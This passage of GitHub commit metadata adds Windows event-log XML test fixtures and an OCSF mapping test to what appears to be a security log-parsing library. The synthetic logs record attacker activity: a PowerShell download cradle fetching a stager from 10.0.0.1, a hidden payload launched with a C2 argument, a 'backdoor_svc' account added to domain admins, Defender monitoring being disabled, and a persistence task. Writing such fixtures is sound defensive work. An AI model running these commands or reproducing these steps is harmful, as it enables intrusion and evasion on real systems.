Name=\"Payload\">CommandInvocation(Invoke-Expression): \"Invoke-Expression\"\n+ParameterBinding(Invoke-Expression): name=\"Command\"; value=\"Start-Process -FilePath 'C:\tmp\\payload.exe' -ArgumentList '--c2 10.0.0.1' -WindowStyle Hidden\"</Data>\n+  </EventData>\n+</Event>"
    },
    {
      "sha": "641dbcc75aea355105fddc54ebc9c46ed114246b",
      "filename": "microsoft/tests/inputs/eid-4104.xml",
      "status": "added",
      "additions": 23,
      "deletions": 0,
      "changes": 23,
      "blob_url": "https://github.com/tenzir/library/blob/94f723890ff78a032c30c1653aae5d60a89c673a/microsoft%2Ftests%2Finputs%2Feid-4104.xml",
      "raw_url": "https://github.com/tenzir/library/raw/94f723890ff78a032c30c1653aae5d60a89c673a/microsoft%2Ftests%2Finputs%2Feid-4104.xml",
      "contents_url": "https://api.github.com/repos/tenzir/library/contents/microsoft%2Ftests%2Finputs%2Feid-4104.xml?ref=94f723890ff78a032c30c1653aae5d60a89c673a",
      "patch": "@@ -0,0 +1,23 @@\n+<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\n+  <System>\n+    <Provider Name=\"Microsoft-Windows-PowerShell\" Guid=\"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}\"/>\n+    <EventID>4104</EventID>\n+    <Version>1</Version>\n+    <Level>3</Level>\n+    <Task>2</Task>\n+    <Keywords>0x0</Keywords>\n+    <TimeCreated SystemTime=\"2024-03-23T12:34:56.789012300Z\"/>\n+    <EventRecordID>20104</EventRecordID>\n+    <Correlation ActivityID=\"{abc123-def456}\"/>\n+    <Execution ProcessID=\"6812\" ThreadID=\"7120\"/>\n+    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>\n+    <Computer>WINHOST01.corp.local</Computer>\n+  </System>\n+  <EventData>\n+    <Data Name=\"MessageNumber\">1</Data>\n+    <Data Name=\"MessageTotal\">1</Data>\n+    <Data Name=\"ScriptBlockText\">IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.1/stager.ps1'); Start-Process -FilePath 'C:\\tmp\\payload.exe' -ArgumentList '--c2 10.0.0.1' -WindowStyle Hidden</Data>\n+    <Data Name=\"ScriptBlockId\">{f3a1b2c3-d4e5-6f7a-8b9c-0d1e2f3a4b5c}</Data>\n+    <Data Name=\"Path\"></Data>\n+  </EventData>\n+</Event>"
    },
    {
      "sha": "ec0df68fbaed2f8362f9d60f8da9fb4878ccd218",
      "filename": "microsoft/tests/inputs/eid-4105.xml",
      "status": "added",
      "additions": 20,
      "deletions": 0,
      "changes": 20,
      "blob_url": "https://github.com/tenzir/library/blob/94f723890ff78a032c30c1653aae5d60a89c673a/microsoft%2Ftests%2Finputs%2Feid-4105.xml",
      "raw_url": "https://github.com/tenzir/library/raw/94f723890ff78a032c30c1653aae5d60a89c673a/microsoft%2Ftests%2Finputs%2Feid-4105.xml",
      "contents_url": "https://api.github.com/repos/tenzir/library/contents/microsoft%2Ftests%2Finputs%2Feid-4105.xml?ref=94f723890ff78a032c30c1653aae5d60a89c673a",
      "patch": "@@ -0,0 +1,20 @@\n+<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\n+  <System>\n+    <Provider Name=\"Microsoft-Windows-PowerShell\" Guid=\"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}\"/>\n+    <EventID>4105</EventID>\n+    <Version>1</Version>\n+    <Level>5</Level>\n+    <Task>2</Task>\n+    <Keywords>0x0</Keywords>\n+    <TimeCreated SystemTime=\"2024-03-23T12:34:56.789012300Z\"/>\n+    <EventRecordID>20105</EventRecordID>\n+    <Correlation ActivityID=\"{a1b2c3d4-e5f6-47a8-9c0d-1e2f3a4b5c6d}\"/>\n+    <Execution ProcessID=\"6812\" ThreadID=\"7120\"/>\n+    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>\n+    <Computer>WINHOST01.corp.local</Computer>\n+  </System>\n+  <EventData>\n+    <Data Name=\"ScriptBlockId\">{f3a1b2c3-d4e5-6f7a-8b9c-0d1e2f3a4b5c}</Data>\n+    <Data Name=\"RunspaceId\">{a1b2c3d4-e5f6-7a8b-9c0d-1e2f3a4b5c6d}</Data>\n+  </EventData>\n+</Event>"
    },
    {
      "sha": "6f6073cb5f48ff8442de6c7219e5efb8992f5716",
      "filename": "microsoft/tests/inputs/eid-4106.xml",
      "status": "added",
      "additions": 20,
      "deletions": 0,
      "changes": 20,
      "blob_url": "https://github.com/tenzir/library/blob/94f723890ff78a032c30c1653aae5d60a89c673a/microsoft%2Ftests%2Finputs%2Feid-4106.xml",
      "raw_url": "https://github.com/tenzir/library/raw/94f723890ff78a032c30c1653aae5d60a89c673a/microsoft%2Ftests%2Finputs%2Feid-4106.xml",
      "contents_url": "https://api.github.com/repos/tenzir/library/contents/microsoft%2Ftests%2Finputs%2Feid-4106.xml?ref=94f723890ff78a032c30c1653aae5d60a89c673a",
      "patch": "@@ -0,0 +1,20 @@\n+<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\n+  <System>\n+    <Provider Name=\"Microsoft-Windows-PowerShell\" Guid=\"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}\"/>\n+    <EventID>4106</EventID>\n+    <Version>1</Version>\n+    <Level>5</Level>\n+    <Task>2</Task>\n+    <Keywords>0x0</Keywords>\n+    <TimeCreated SystemTime=\"2024-03-23T12:34:56.789012300Z\"/>\n+    <EventRecordID>20106</EventRecordID>\n+    <Correlation ActivityID=\"{a1b2c3d4-e5f6-47a8-9c0d-1e2f3a4b5c6d}\"/>\n+    <Execution ProcessID=\"6812\" ThreadID=\"7120\"/>\n+    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>\n+    <Computer>WINHOST01.corp.local</Computer>\n+  </System>\n+  <EventData>\n+    <Data Name=\"ScriptBlockId\">{f3a1b2c3-d4e5-6f7a-8b9c-0d1e2f3a4b5c}</Data>\n+    <Data Name=\"RunspaceId\">{a1b2c3d4-e5f6-7a8b-9c0d-1e2f3a4b5c6d}</Data>\n+  </EventData>\n+</Event>"
    },
    {
      "sha": "757df097115fb4be3b9293526bec7846f7420691",
      "filename": "microsoft/tests/inputs/eid-4722.xml",
      "status": "added",
      "additions": 25,
      "deletions": 0,
      "changes": 25,
      "blob_url": "https://github.com/tenzir/library/blob/94f723890ff78a032c30c1653aae5d60a89c673a/microsoft%2Ftests%2Finputs%2Feid-4722.xml",
      "raw_url": "https://github.com/tenzir/library/raw/94f723890ff78a032c30c1653aae5d60a89c673a/microsoft%2Ftests%2Finputs%2Feid-4722.xml",
      "contents_url": "https://api.github.com/repos/tenzir/library/contents/microsoft%2Ftests%2Finputs%2Feid-4722.xml?ref=94f723890ff78a032c30c1653aae5d60a89c673a",
      "patch": "@@ -0,0 +1,25 @@\n+<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\n+  <System>\n+    <Provider Name=\"Microsoft-Windows-Security-Auditing\" Guid=\"{5770385F-C994-4D63-B9EC-B6FE73E0CE8A}\"/>\n+    <EventID>4722</EventID>\n+    <Version>0</Version>\n+    <Level>0</Level>\n+    <Task>13824</Task>\n+    <Keywords>0x8020000000000000</Keywords>\n+    <TimeCreated SystemTime=\"2024-03-23T12:34:56.789012300Z\"/>\n+    <EventRecordID>98770</EventRecordID>\n+    <Correlation ActivityID=\"{abc123-def456}\"/>\n+    <Execution ProcessID=\"4\" ThreadID=\"72\"/>\n+    <Channel>Security</Channel>\n+    <Computer>DC01.corp.local</Computer>\n+  </System>\n+  <EventData>\n+    <Data Name=\"SubjectUserSid\">S-1-5-21-3107921522-2185401913-891411500-1104</Data>\n+    <Data Name=\"SubjectUserName\">jdoe</Data>\n+    <Data Name=\"SubjectDomainName\">CORP</Data>\n+    <Data Name=\"SubjectLogonId\">0xA1B2C3</Data>\n+    <Data Name=\"TargetUserName\">backdoor_svc</Data>\n+    <Data Name=\"TargetDomainName\">CORP</Data>\n+    <Data Name=\"TargetSid\">S-1-5-21-3107921522-2185401913-891411500-1500</Data>\n+  </EventData>\n+</Event>"
    },
    {
      "sha": "5c9ba0331fd5ecb12ef4036f53f6b764aa8f120b",
      "filename": "microsoft/tests/inputs/eid-4725.xml",
      "status": "added",
      "additions": 25,
      "deletions": 0,
      "changes": 25,
      "blob_url": "https://github.com/tenzir/library/blob/94f723890ff78a032c30c1653aae5d60a89c673a/microsoft%2Ftests%2Finputs%2Feid-4725.xml",
      "raw_url": "https://github.com/tenzir/library/raw/94f723890ff78a032c30c1653aae5d60a89c673a/microsoft%2Ftests%2Finputs%2Feid-4725.xml",
      "contents_url": "https://api.github.com/repos/tenzir/library/contents/microsoft%2Ftests%2Finputs%2Feid-4725.xml?ref=94f723890ff78a032c30c1653aae5d60a89c673a",
      "patch": "@@ -0,0 +1,25 @@\n+<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\n+  <System>\n+    <Provider Name=\"Microsoft-Windows-Security-Auditing\" Guid=\"{5770385F-C994-4D63-B9EC-B6FE73E0CE8A}\"/>\n+    <EventID>4725</EventID>\n+    <Version>0</Version>\n+    <Level>0</Level>\n+    <Task>13824</Task>\n+    <Keywords>0x8020000000000000</Keywords>\n+    <TimeCreated SystemTime=\"2024-03-23T12:34:56.789012300Z\"/>\n+    <EventRecordID>98773</EventRecordID>\n+    <Correlation ActivityID=\"{abc123-def456}\"/>\n+    <Execution ProcessID=\"4\" ThreadID=\"72\"/>\n+    <Channel>Security</Channel>\n+    <Computer>DC01.corp.local</Computer>\n+  </System>\n+  <EventData>\n+    <Data Name=\"SubjectUserSid\">S-1-5-21-3107921522-2185401913-891411500-1104</Data>\n+    <Data Name=\"SubjectUserName\">jdoe</Data>\n+    <Data Name=\"SubjectDomainName\">CORP</Data>\n+    <Data Name=\"SubjectLogonId\">0xA1B2C3</Data>\n+    <Data Name=\"TargetUserName\">backdoor_svc</Data>\n+    <Data Name=\"TargetDomainName\">CORP</Data>\n+    <Data Name=\"TargetSid\">S-1-5-21-3107921522-2185401913-891411500-1500</Data>\n+  </EventData>\n+</Event>"
    },
    {
      "sha": "227893529adc9f091b844568a070ad6beec30a95",
      "filename": "microsoft/tests/inputs/eid-4726.xml",
      "status": "added",
      "additions": 26,
      "deletions": 0,
      "changes": 26,
      "blob_url": "https://github.com/tenzir/library/blob/94f723890ff78a032c30c1653aae5d60a89c673a/microsoft%2Ftests%2Finputs%2Feid-4726.xml",
      "raw_url": "https://github.com/tenzir/library/raw/94f723890ff78a032c30c1653aae5d60a89c673a/microsoft%2Ftests%2Finputs%2Feid-4726.xml",
      "contents_url": "https://api.github.com/repos/tenzir/library/contents/microsoft%2Ftests%2Finputs%2Feid-4726.xml?ref=94f723890ff78a032c30c1653aae5d60a89c673a",
      "patch": "@@ -0,0 +1,26 @@\n+<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\n+  <System>\n+    <Provider Name=\"Microsoft-Windows-Security-Auditing\" Guid=\"{5770385F-C994-4D63-B9EC-B6FE73E0CE8A}\"/>\n+    <EventID>4726</EventID>\n+    <Version>0</Version>\n+    <Level>0</Level>\n+    <Task>13824</Task>\n+    <Keywords>0x8020000000000000</Keywords>\n+    <TimeCreated SystemTime=\"2024-03-23T12:34:56.789012300Z\"/>\n+    <EventRecordID>98774</EventRecordID>\n+    <Correlation ActivityID=\"{abc123-def456}\"/>\n+    <Execution ProcessID=\"4\" ThreadID=\"72\"/>\n+    <Channel>Security</Channel>\n+    <Computer>DC01.corp.local</Computer>\n+  </System>\n+  <EventData>\n+    <Data Name=\"SubjectUserSid\">S-1-5-21-3107921522-2185401913-891411500-1104</Data>\n+    <Data Name=\"SubjectUserName\">jdoe</Data>\n+    <Data Name=\"SubjectDomainName\">CORP</Data>\n+    <Data Name=\"SubjectLogonId\">0xA1B2C3</Data>\n+    <Data Name=\"TargetUserName\">backdoor_svc</Data>\n+    <Data Name=\"TargetDomainName\">CORP</Data>\n+    <Data Name=\"TargetSid\">S-1-5-21-3107921522-2185401913-891411500-1500</Data>\n+    <Data Name=\"PrivilegeList\">-</Data>\n+  </EventData>\n+</Event>"
    },
    {
      "sha": "606011db22116fc4ba9d6fe6d58c838e83992e55",
      "filename": "microsoft/tests/inputs/eid-4728.xml",
      "status": "added",
      "additions": 28,
      "deletions": 0,
      "changes": 28,
      "blob_url": "https://github.com/tenzir/library/blob/94f723890ff78a032c30c1653aae5d60a89c673a/microsoft%2Ftests%2Finputs%2Feid-4728.xml",
      "raw_url": "https://github.com/tenzir/library/raw/94f723890ff78a032c30c1653aae5d60a89c673a/microsoft%2Ftests%2Finputs%2Feid-4728.xml",
      "contents_url": "https://api.github.com/repos/tenzir/library/contents/microsoft%2Ftests%2Finputs%2Feid-4728.xml?ref=94f723890ff78a032c30c1653aae5d60a89c673a",
      "patch": "@@ -0,0 +1,28 @@\n+<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\n+  <System>\n+    <Provider Name=\"Microsoft-Windows-Security-Auditing\" Guid=\"{5770385F-C994-4D63-B9EC-B6FE73E0CE8A}\"/>\n+    <EventID>4728</EventID>\n+    <Version>0</Version>\n+    <Level>0</Level>\n+    <Task>13826</Task>\n+    <Keywords>0x8020000000000000</Keywords>\n+    <TimeCreated SystemTime=\"2024-03-23T12:34:56.789012300Z\"/>\n+    <EventRecordID>98776</EventRecordID>\n+    <Correlation ActivityID=\"{abc123-def456}\"/>\n+    <Execution ProcessID=\"4\" ThreadID=\"72\"/>\n+    <Channel>Security</Channel>\n+    <Computer>DC01.corp.local</Computer>\n+  </System>\n+  <EventData>\n+    <Data Name=\"SubjectUserSid\">S-1-5-21-3107921522-2185401913-891411500-1104</Data>\n+    <Data Name=\"SubjectUserName\">jdoe</Data>\n+    <Data Name=\"SubjectDomainName\">CORP</Data>\n+    <Data Name=\"SubjectLogonId\">0xA1B2C3</Data>\n+    <Data Name=\"MemberName\">CN=backdoor_svc,CN=Users,DC=corp,DC=local</Data>\n+    <Data Name=\"MemberSid\">S-1-5-21-3107921522-2185401913-891411500-1500</Data>\n+    <Data Name=\"TargetUserName\">DomainAdmins</Data>\n+    <Data Name=\"TargetDomainName\">CORP</Data>\n+    <Data Name=\"TargetSid\">S-1-5-21-3107921522-2185401913-891411500-512</Data>\n+    <Data Name=\"PrivilegeList\">-</Data>\n+  </EventData>\n+</Event>"
    },
    {
      "sha": "2fce544706f1811de430f7655698b45197a924b1",
      "filename": "microsoft/tests/inputs/eid-4730.xml",
      "status": "added",
      "additions": 26,
      "deletions": 0,
      "changes": 26,
      "blob_url": "https://github.com/tenzir/library/blob/94f723890ff78a032c30c1653aae5d60a89c673a/microsoft%2Ftests%2Finputs%2Feid-4730.xml",
      "raw_url": "https://github.com/tenzir/library/raw/94f723890ff78a032c30c1653aae5d60a89c673a/microsoft%2Ftests%2Finputs%2Feid-4730.xml",
      "contents_url": "https://api.github.com/repos/tenzir/library/contents/microsoft%2Ftests%2Finputs%2Feid-4730.xml?ref=94f723890ff78a032c30c1653aae5d60a89c673a",
      "patch": "@@ -0,0 +1,26 @@\n+<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\n+  <System>\n+    <Provider Name=\"Microsoft-Windows-Security-Auditing\" Guid=\"{5770385F-C994-4D63-B9EC-B6FE73E0CE8A}\"/>\n+    <EventID>4730</EventID>\n+    <Version>0</Version>\n+    <Level>0</Level>\n+    <Task>13827</Task>\n+    <Keywords>0x8020000000000000</Keywords>\n+    <TimeCreated SystemTime=\"2024-03-23T12:34:56.789012300Z\"/>\n+    <EventRecordID>98778</EventRecordID>\n+    <Correlation ActivityID=\"{abc123-def456}\"/>\n+    <Execution ProcessID=\"4\" ThreadID=\"72\"/>\n+    <Channel>Security</Channel>\n+    <Computer>DC01.corp.local</Computer>\n+  </System>\n+  <EventData>\n+    <Data Name=\"SubjectUserSid\">S-1-5-21-3107921522-2185401913-891411500-1104</Data>\n+    <Data Name=\"SubjectUserName\">jdoe</Data>\n+    <Data Name=\"SubjectDomainName\">CORP</Data>\n+    <Data Name=\"SubjectLogonId\">0xA1B2C3</Data>\n+    <Data Name=\"TargetUserName\">OldAdmins</Data>\n+    <Data Name=\"TargetDomainName\">CORP</Data>\n+    <Data Name=\"TargetSid\">S-1-5-21-3107921522-2185401913-891411500-2000</Data>\n+    <Data Name=\"PrivilegeList\">-</Data>\n+  </EventData>\n+</Event>"
    },
    {
      "sha": "c24bce441a59dd3840dd89e2f66e9b6ba7771dd6",
      "filename": "microsoft/tests/inputs/eid-5001.xml",
      "status": "added",
      "additions": 20,
      "deletions": 0,
      "changes": 20,
      "blob_url": "https://github.com/tenzir/library/blob/94f723890ff78a032c30c1653aae5d60a89c673a/microsoft%2Ftests%2Finputs%2Feid-5001.xml",
      "raw_url": "https://github.com/tenzir/library/raw/94f723890ff78a032c30c1653aae5d60a89c673a/microsoft%2Ftests%2Finputs%2Feid-5001.xml",
      "contents_url": "https://api.github.com/repos/tenzir/library/contents/microsoft%2Ftests%2Finputs%2Feid-5001.xml?ref=94f723890ff78a032c30c1653aae5d60a89c673a",
      "patch": "@@ -0,0 +1,20 @@\n+<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\n+  <System>\n+    <Provider Name=\"Microsoft-Windows-Windows Defender\" Guid=\"{11CD958A-C507-4EF3-B3F2-5FD9DFBD2C78}\"/>\n+    <EventID>5001</EventID>\n+    <Version>0</Version>\n+    <Level>3</Level>\n+    <Task>0</Task>\n+    <Keywords>0x8000000000000000</Keywords>\n+    <TimeCreated SystemTime=\"2024-03-23T12:34:56.789012300Z\"/>\n+    <EventRecordID>45001</EventRecordID>\n+    <Correlation/>\n+    <Execution ProcessID=\"3120\" ThreadID=\"4056\"/>\n+    <Channel>Microsoft-Windows-Windows Defender/Operational</Channel>\n+    <Computer>WINHOST01.corp.local</Computer>\n+  </System>\n+  <EventData>\n+    <Data Name=\"Product Name\">Windows Defender Antivirus</Data>\n+    <Data Name=\"Product Version\">4.18.24010.12</Data>\n+  </EventData>\n+</Event>"
    },
    {
      "sha": "51477f0e31890d77089f1e0b01bbb44671a4141a",
      "filename": "microsoft/tests/inputs/eid-5007.xml",
      "status": "added",
      "additions": 22,
      "deletions": 0,
      "changes": 22,
      "blob_url": "https://github.com/tenzir/library/blob/94f723890ff78a032c30c1653aae5d60a89c673a/microsoft%2Ftests%2Finputs%2Feid-5007.xml",
      "raw_url": "https://github.com/tenzir/library/raw/94f723890ff78a032c30c1653aae5d60a89c673a/microsoft%2Ftests%2Finputs%2Feid-5007.xml",
      "contents_url": "https://api.github.com/repos/tenzir/library/contents/microsoft%2Ftests%2Finputs%2Feid-5007.xml?ref=94f723890ff78a032c30c1653aae5d60a89c673a",
      "patch": "@@ -0,0 +1,22 @@\n+<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\n+  <System>\n+    <Provider Name=\"Microsoft-Windows-Windows Defender\" Guid=\"{11CD958A-C507-4EF3-B3F2-5FD9DFBD2C78}\"/>\n+    <EventID>5007</EventID>\n+    <Version>0</Version>\n+    <Level>4</Level>\n+    <Task>0</Task>\n+    <Keywords>0x8000000000000000</Keywords>\n+    <TimeCreated SystemTime=\"2024-03-23T12:34:56.789012300Z\"/>\n+    <EventRecordID>45007</EventRecordID>\n+    <Correlation/>\n+    <Execution ProcessID=\"3120\" ThreadID=\"4056\"/>\n+    <Channel>Microsoft-Windows-Windows Defender/Operational</Channel>\n+    <Computer>WINHOST01.corp.local</Computer>\n+  </System>\n+  <EventData>\n+    <Data Name=\"Product Name\">Windows Defender Antivirus</Data>\n+    <Data Name=\"Product Version\">4.18.24010.12</Data>\n+    <Data Name=\"Old Value\">HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection\\DisableRealtimeMonitoring = 0x0</Data>\n+    <Data Name=\"New Value\">HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection\\DisableRealtimeMonitoring = 0x1</Data>\n+  </EventData>\n+</Event>"
    },
    {
      "sha": "d766ae3330d23bfffea73f578e06a8d6ef8d2097",
      "filename": "microsoft/tests/ocsf/eid-0100.tql",
      "status": "added",
      "additions": 10,
      "deletions": 0,
      "changes": 10,
      "blob_url": "https://github.com/tenzir/library/blob/94f723890ff78a032c30c1653aae5d60a89c673a/microsoft%2Ftests%2Focsf%2Feid-0100.tql",
      "raw_url": "https://github.com/tenzir/library/raw/94f723890ff78a032c30c1653aae5d60a89c673a/microsoft%2Ftests%2Focsf%2Feid-0100.tql",
      "contents_url": "https://api.github.com/repos/tenzir/library/contents/microsoft%2Ftests%2Focsf%2Feid-0100.tql?ref=94f723890ff78a032c30c1653aae5d60a89c673a",
      "patch": "@@ -0,0 +1,10 @@\n+from_file f\"{env(\"TENZIR_INPUTS\")}/eid-0100.xml\" {\n+  read_all\n+}\n+microsoft::windows::ocsf::map data\n+this = ocsf\n+ocsf::derive\n+ocsf::cast\n+\n+// Ensure deterministic tests.\n+drop metadata.processed_time"
    },
    {
      "sha": "6cebd1492e75c32cffa69c85e9367ac5b547d141",
      "filename": "microsoft/tests/ocsf/eid-0100.txt",
      "status": "added",
      "additions": 64,
      "deletions": 0,
      "changes": 64,
      "blob_url": "https://github.com/tenzir/library/blob/94f723890ff78a032c30c1653aae5d60a89c673a/microsoft%2Ftests%2Focsf%2Feid-0100.txt",
      "raw_url": "https://github.com/tenzir/library/raw/94f723890ff78a032c30c1653aae5d60a89c673a/microsoft%2Ftests%2Focsf%2Feid-0100.txt",
      "contents_url": "https://api.github.com/repos/tenzir/library/contents/microsoft%2Ftests%2Focsf%2Feid-0100.txt?ref=94f723890ff78a032c30c1653aae5d60a89c673a",
      "patch": "@@ -0,0 +1,64 @@\n+{\n+  activity_id: 6,\n+  activity_name: \"Start\",\n+  actor: {\n+    user: {\n+      domain: \"NT AUTHORITY\",\n+      name: \"SYSTEM\",\n+    },\n+  },\n+  category_name: \"System Activity\",\n+  category_uid: 1,\n+  class_name: \"Scheduled Job Activity\",\n+  class_uid: 1006,\n+  device: {\n+    hostname: \"WINHOST01.corp.local\",\n+  },\n+  job: {\n+    name: \"\\\\Microsoft\\\\Windows\\\\UpdateOrchestrator\\\\payload_persist\",\n+  },\n+  metadata: {\n+    event_code: \"100\",\n+    extensions: [\n+      {\n+        name: \"win\",\n+      },\n+    ],\n+    log_format: \"xml\",\n+    log_level: \"4\",\n+    log_name: \"Microsoft-Windows-TaskScheduler/Operational\",\n+    log_version: \"0\",\n+    logged_time: 2024-03-23T12:34:56.789012300Z,\n+    original_event_uid: \"30100\",\n+    product: {\n+      name: \"Microsoft-Windows-TaskScheduler\",\n+      uid: \"{DE7B24EA-73C8-4A09-985D-5BDADCFA9017}\",\n+      vendor_name: \"Microsoft\",\n+    },\n+    profiles: [\n+      \"host\",\n+    ],\n+    version: \"1.7.0\",\n+  },\n+  raw_data: \"<Event xmlns=\\\"http://schemas.microsoft.com/win/2004/08/events/event\\\">\\n  <System>\\n    <Provider Name=\\\"Microsoft-Windows-TaskScheduler\\\" Guid=\\\"{DE7B24EA-73C8-4A09-985D-5BDADCFA9017}\\\"/>\\n    <EventID>100</EventID>\\n    <Version>0</Version>\\n    <Level>4</Level>\\n    <Task>0</Task>\\n    <Keywords>0x8000000000000000</Keywords>\\n    <TimeCreated SystemTime=\\\"2024-03-23T12:34:56.789012300Z\\\"/>\\n    <EventRecordID>30100</EventRecordID>\\n    <Correlation/>\\n    <Execution ProcessID=\\\"1032\\\" ThreadID=\\\"2048\\\"/>\\n    <Channel>Microsoft-Windows-TaskScheduler/Operational</Channel>\\n    <Computer>WINHOST01.corp.local</Computer>\\n  </System>\\n  <EventData>\\n    <Data Name=\\\"TaskName\\\">\\\\Microsoft\\\\Windows\\\\UpdateOrchestrator\\\\payload_persist</Data>\\n    <Data Name=\\\"UserContext\\\">NT AUTHORITY\\\\SYSTEM</Data>\\n    <Data Name=\\\"InstanceId\\\">{EC84F653-CA0D-4CD0-828E-FDE7D609F86C}</Data>\\n  </EventData>\\n</Event>\\n\",\n+  raw_data_size: 871,\n+  severity: \"Informational\",\n+  severity_id: 1,\n+  time: 2024-03-23T12:34:56.789012300Z,\n+  type_name: \"Scheduled Job Activity: Start\",\n+  type_uid: 100606,\n+  unmapped: {\n+    System: {\n+      Task: 0,\n+      Keywords: \"0x8000000000000000\",\n+      Correlation: null,\n+      Execution: {\n+        ProcessID: 1032,\n+        ThreadID: 2048,\n+      },\n+    },\n+    EventData: {\n+      InstanceId: \"{EC84F653-CA0D-4CD0-828E-FDE7D609F86C}\",\n+    },\n+  },\n+}"
    },
